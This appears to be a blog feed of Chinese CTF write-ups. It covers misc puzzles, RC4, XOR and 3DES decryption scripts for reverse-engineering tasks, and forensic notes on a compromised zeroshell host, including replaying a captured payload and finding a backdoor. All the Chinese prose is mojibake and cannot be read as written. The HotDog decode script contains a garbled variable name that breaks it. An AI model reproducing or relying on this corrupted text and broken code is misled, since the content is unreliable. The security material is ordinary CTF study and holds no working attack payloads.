        <content type="html"><![CDATA[<h2 id="å¤ªæ"><a href="#å¤ªæ" class="headerlink" title="å¤ªæ"></a>å¤ªæ</h2><p>ç»™äº†æç¤º</p><p>éƒ¨åˆ†flagç»„æˆ: wucup tieny-</p><p>å¤ªæç”Ÿä¸¤ä»ª-ä¸¤ä»ªç”Ÿå››è±¡-å››è±¡ç”Ÿå…«å¦-å…«å¦å®šå‰å‡¶-å‰å‡¶ç”Ÿå¤§ä¸šï¼Œå¯ä»¥çœ‹å‡ºæ˜¯æ‹¼éŸ³ï¼Œé¡ºåºå–æ¯ä¸ªå­—çš„1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ä¸ªå­—æ¯ï¼Œè¶…å‡ºé•¿åº¦çš„å°±å–ä½™å¾—åˆ°flag</p><p>tieny-lieig-sieau-bunig-jieay</p><h2 id="åŸç¥å¯åŠ¨"><a href="#åŸç¥å¯åŠ¨" class="headerlink" title="åŸç¥å¯åŠ¨"></a>åŸç¥å¯åŠ¨</h2><p>ç›´æ¥lsbæ‹¿åˆ°ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…å¯†ç </p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241230235832286.png" class=""><p>è§£å‹æ‹¿åˆ°worldï¼Œæ‰¾åˆ°ä¸€ä¸ªå›¾ç‰‡ä¹Ÿæœ‰ä¸€æ®µflag åœ¨è¿™ä¸ªå›¾ç‰‡ä¸‹é¢æœ‰éšè—çš„flag</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241230235844075.png" class="">ä¹‹åè§£å‹å‹ç¼©åŒ…å³å¯æ‹¿åˆ°flag<h2 id="misc-ç­¾åˆ°"><a href="#misc-ç­¾åˆ°" class="headerlink" title="misc ç­¾åˆ°"></a>misc ç­¾åˆ°</h2><p>ç›´æ¥cyberchef hexè§£å¯†å³å¯æ‹¿åˆ°flag</p><h2 id="æ—‹è½¬æœ¨é©¬"><a href="#æ—‹è½¬æœ¨é©¬" class="headerlink" title="æ—‹è½¬æœ¨é©¬"></a>æ—‹è½¬æœ¨é©¬</h2><p>ç¼–å†™è„šæœ¬53è½®base64è§£å¯†å³å¯æ‹¿16è¿›åˆ¶çš„å­—ç¬¦ç›´æ¥cyberchefè§£å¯†å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;misc/flag1&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag1 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;misc/flag2&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        flag = base64.b64decode(flag)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><p>ç­¾åˆ°é¢˜ï¼Œèšå‰‘è¿æ¥å³å¯</p><h2 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h2><p>ä¸¢ç»™gptï¼Œç›´æ¥å‡ºè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Flag.txt ä¸­çš„å¯†æ–‡</span></span><br><span class="line">flag_hex = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">d8d2 963e 0d8a b853 3d2a 7fe2 96c5 2923</span></span><br><span class="line"><span class="string">3924 6eba 0d29 2d57 5257 8359 322c 3a77</span></span><br><span class="line"><span class="string">892d fa72 61b8 4f</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># è½¬æ¢å¯†æ–‡ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(flag_hex.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†é’¥</span></span><br><span class="line">key = <span class="string">b&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ– S å’Œ T</span></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">t = [(key[i % <span class="built_in">len</span>(key)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># KSA (Key Scheduling Algorithm)</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s[i] + t[i]) % <span class="number">256</span></span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†</span></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">plaintext = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(ciphertext))</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line">    x = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">    plaintext[m] = ciphertext[m] ^ s[x]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ˜æ–‡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, plaintext.decode())</span><br></pre></td></tr></table></figure><h2 id="HotDog"><a href="#HotDog" class="headerlink" title="HotDog"></a>HotDog</h2><p>è¿›å…¥ç¨‹åºåæˆ‘ä»¬å¯ä»¥çœ‹è§æœ‰æŒ‰é’®ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨jadxé€†å‘ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰onclickï¼Œæ¥åˆ°onclickå¯ä»¥çœ‹è§æœ‰verifyå‡½æ•°</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241230235949597.png" class=""><p>ä½†æ˜¯verifyé‡Œé¢æ˜¯ç©ºçš„</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241230235957492.png" class=""><p>æˆ‘ä»¬åœ¨å¦ä¸€ä¸ªç±»é‡Œå¯ä»¥çœ‹è§å…¶å¼•ç”¨ç±»åŠ¨æ€é“¾æ¥åº“ï¼Œæˆ‘ä»¬å»åŠ¨æ€é“¾æ¥åº“é‡Œçœ‹ä¸€çœ‹</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000004401.png" class=""><p>ç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹soæ–‡ä»¶å‘ç°æœ‰ä¸ªè§£å¯†å‡½æ•°æˆ‘ä»¬è§£å¯†ä¸€ä¸‹</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000012976.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key1= <span class="number">0x7b</span></span><br><span class="line">key2= <span class="number">0xc2</span></span><br><span class="line">enc=[<span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD5</span>, <span class="number">0xD1</span>, <span class="number">0xD1</span>, <span class="number">0xCD</span>, <span class="number">0xCA</span>, <span class="number">0x03</span>,</span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x16</span>, <span class="number">0xCD</span>, <span class="number">0xDC</span>, <span class="number">0xD7</span>, <span class="number">0x17</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xDA</span>, <span class="number">0xD0</span>,</span><br><span class="line">  <span class="number">0xCD</span>, <span class="number">0x17</span>, <span class="number">0xDA</span>, <span class="number">0xD7</span>, <span class="number">0x16</span>, <span class="number">0xDA</span>, <span class="number">0xD5</span>, <span class="number">0xDC</span>, <span class="number">0xD9</span>, <span class="number">0xD9</span>,</span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0xD7</span>, <span class="number">0xDE</span>, <span class="number">0xE0</span>, <span class="number">0x16</span>, <span class="number">0xD5</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xE1</span>, <span class="number">0xD6</span>,</span><br><span class="line">  <span class="number">0xDE</span>, <span class="number">0x17</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0xC5</span>, <span class="number">0x3D</span>]</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="built_in">len</span>(enc)):</span><br><span class="line">  enc[i] = enc[i] - key2 ^ key1</span><br><span class="line">  <span class="keyword">if</span> enc[i]&lt; <span class="number">0</span>:</span><br><span class="line">    enc[i]+=<span class="number">256</span></span><br><span class="line">  enc[i]  = <span class="built_in">chr</span>(ennagc[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(enc[<span class="number">4</span>:]))</span><br></pre></td></tr></table></figure><p>è§£å‡ºæ¥æ˜¯ä¸€ä¸ªç½‘å€ï¼Œå¯ä»¥ä¸‹è½½è¡¥å…¨apkçš„dexæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬æ‰“å¼€dexæ–‡ä»¶è¿›è¡Œåˆ†æ</p><p>åœ¨encryptCbcä¸­ï¼Œå®ç°äº†3desåŠ å¯†ï¼Œç„¶åkeyå’Œivéƒ½æ˜¯ä»dataé‡Œé¢è¯»å–çš„ã€‚</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000026075.png" class=""><p>ç”±äºä¸æ¸…æ¥šä¸€æ®µé•¿æ•°æ®å¦‚ä½•è½¬åŒ–ä¸ºIVå’Œkeyï¼Œæ‰€ä»¥ç›´æ¥æŠŠä»–ä»£ç æ‹¿æ¥ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> WB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.Security;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.InflaterInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESedeKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HotDog</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM_3DES</span> <span class="operator">=</span> <span class="string">&quot;DESEDE&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> IvParameterSpec IV_PARAMETER_SPEC;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Key <span class="title function_">keyGenerator</span><span class="params">(<span class="type">byte</span>[] bArr)</span> <span class="keyword">throws</span> InvalidKeyException, NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">        <span class="keyword">return</span> SecretKeyFactory.getInstance(ALGORITHM_3DES).generateSecret(<span class="keyword">new</span> <span class="title class_">DESedeKeySpec</span>(bArr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">InflaterInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/lemon/Desktop/pwn/pwn-enclosure/5-compi/WB/hotdog/data&quot;</span>)));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.IV_PARAMETER_SPEC = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>((<span class="type">byte</span>[]) objectInputStream.readObject());</span><br><span class="line">                System.out.println(Arrays.toString(<span class="built_in">this</span>.IV_PARAMETER_SPEC.getIV()));</span><br><span class="line">                System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="built_in">this</span>.encryptCbc((<span class="type">byte</span>[]) objectInputStream.readObject(), (<span class="type">byte</span>[]) objectInputStream.readObject(), Padding.PKCS5_PADDING)));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Padding</span> &#123;</span><br><span class="line">        NO_PADDING(<span class="string">&quot;NoPadding&quot;</span>),</span><br><span class="line">        PKCS5_PADDING(<span class="string">&quot;PKCS5Padding&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String value;</span><br><span class="line"></span><br><span class="line">        Padding(String str) &#123;</span><br><span class="line">            <span class="built_in">this</span>.value = str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] encryptCbc(<span class="type">byte</span>[] bArr, <span class="type">byte</span>[] bArr2, Padding padding) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Key</span> <span class="variable">keyGenerator</span> <span class="operator">=</span> keyGenerator(bArr);</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DESEDE/CBC/&quot;</span> + padding.value);</span><br><span class="line">            cipher.init(Cipher.DECRYPT_MODE, keyGenerator, <span class="built_in">this</span>.IV_PARAMETER_SPEC);</span><br><span class="line">            <span class="keyword">return</span> cipher.doFinal(bArr2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidAlgorithmParameterException unused) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Illegal algorithm parameter&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeyException unused2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Invalid Key&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException unused3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;No such algorithm&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeySpecException unused4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Invalid key spec&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BadPaddingException unused5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Bad padding&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException unused6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Illegal block size&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchPaddingException unused7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;No such padding&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">HotDog</span> <span class="variable">hotDog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotDog</span>();</span><br><span class="line">        hotDog.test();</span><br><span class="line"><span class="comment">//        System.out.println(Arrays.toString(hotDog.IV_PARAMETER_SPEC.getIV()));</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000045162.png" class=""><h2 id="If-you-know"><a href="#If-you-know" class="headerlink" title="If you know"></a>If you know</h2><p>ç¨‹åºæœ‰upxçš„å£³ï¼Œå»å£³åï¼š</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000056029.png" class=""><p>åœ¨finiä¸­æœ‰flagåŠ å¯†é€»è¾‘ï¼š</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000103891.png" class=""><p>åŠ å¯†2ï¼š</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000112426.png" class=""><p>åŠ å¯†1ï¼š</p><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000119846.png" class=""><p>ç®€å•çš„å¼‚æˆ–ååç§»ï¼Œè§£å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">l = [</span><br><span class="line">    <span class="number">0xF5</span>, <span class="number">0x200</span>, <span class="number">0x208</span>, <span class="number">0x1EF</span>, <span class="number">0x235</span>, <span class="number">0x274</span>, <span class="number">0x23A</span>, <span class="number">0x276</span>, <span class="number">0x2B7</span>,</span><br><span class="line">    <span class="number">0x306</span>, <span class="number">0x2B2</span>, <span class="number">0x313</span>, <span class="number">0x2E2</span>, <span class="number">0x32F</span>, <span class="number">0x371</span>, <span class="number">0x440</span>, <span class="number">0x338</span>, <span class="number">0x3E9</span>,</span><br><span class="line">    <span class="number">0x3E2</span>, <span class="number">0x3B6</span>, <span class="number">0x407</span>, <span class="number">0x43E</span>, <span class="number">0x3BA</span>, <span class="number">0x3F4</span>, <span class="number">0x415</span>, <span class="number">0x473</span>, <span class="number">0x4DA</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">cipher</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(cipher)</span><br><span class="line">    flag = [<span class="number">0</span>] * length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        flag[idx] = cipher[idx]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(length)):</span><br><span class="line">        <span class="keyword">if</span> j % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">                flag[i] = flag[i] - (i + j + <span class="number">2</span>) ^ i</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                flag[i] = flag[i] - (i + j + <span class="number">1</span>) ^ i</span><br><span class="line"></span><br><span class="line">    flag_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(f) <span class="keyword">for</span> f <span class="keyword">in</span> flag)</span><br><span class="line">    <span class="keyword">return</span> flag_string</span><br><span class="line"></span><br><span class="line">flag = decrypt_flag(l)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><img src="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/IMAGE20241231000136277.png" class="">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024Ciscn-é•¿åŸæ¯Wp</title>
      <link href="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/"/>
      <url>/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/</url>
      
        <content type="html"><![CDATA[<h2 id="å¨èƒæ£€æµ‹ä¸ç½‘ç»œæµé‡åˆ†æ"><a href="#å¨èƒæ£€æµ‹ä¸ç½‘ç»œæµé‡åˆ†æ" class="headerlink" title="å¨èƒæ£€æµ‹ä¸ç½‘ç»œæµé‡åˆ†æ"></a>å¨èƒæ£€æµ‹ä¸ç½‘ç»œæµé‡åˆ†æ</h2><h3 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h3><p>åœ¨æµé‡çš„Refereré‡Œï¼ŒCTF-NETAèƒ½ç§’</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230234847797.png" class=""><h3 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h3><p>ç”¨æµé‡ä¸­çš„payloadå»æ‰“ï¼Œflagåœ¨&#x2F;Databaseé‡Œè¾¹</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230234907953.png" class=""><h3 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h3><p>ä»æµé‡åŒ…é‡Œçœ‹çš„<br>ip.src&#x3D;61â€¦..100</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230234922784.png" class=""><p>è¿æ¥çš„IPåªæœ‰ä¸‰ä¸ªï¼Œ128æœ‰ç™»é™†è¯·æ±‚ï¼Œæ‰€ä»¥è¿˜å‰©ä¸¤ä¸ª éƒ½è¯•è¯•ä¹Ÿèƒ½å‡ºï¼Œä½†æ˜¯202çš„æ—¶é—´å¾ˆè§„å¾‹ï¼Œæ‰€ä»¥æäº¤çš„202</p><h3 id="zeroshell-4"><a href="#zeroshell-4" class="headerlink" title="zeroshell_4"></a>zeroshell_4</h3><p>shellä¸€ç›´å¼¹ä¸å‡ºæ¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ ï½œ &amp; éƒ½è¯†åˆ«ä¸äº†ï¼Œç¼–ç ä¹Ÿä¸è¡Œ</p><p>æ‰§è¡Œnetstat -anp ä¸æ–­åˆ·æ–°èƒ½çœ‹åˆ°æœ‰202.115.89.103çš„è¿æ¥ï¼Œæ ¹æ®è¿›ç¨‹æŸ¥åˆ°</p><p>Ls -al &#x2F;proc&#x2F;id&#x2F;exe èƒ½çœ‹åˆ° è¿æ¥åˆ°&#x2F;tmp&#x2F;.nginx</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230234945300.png" class=""><h3 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h3><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230234958471.png" 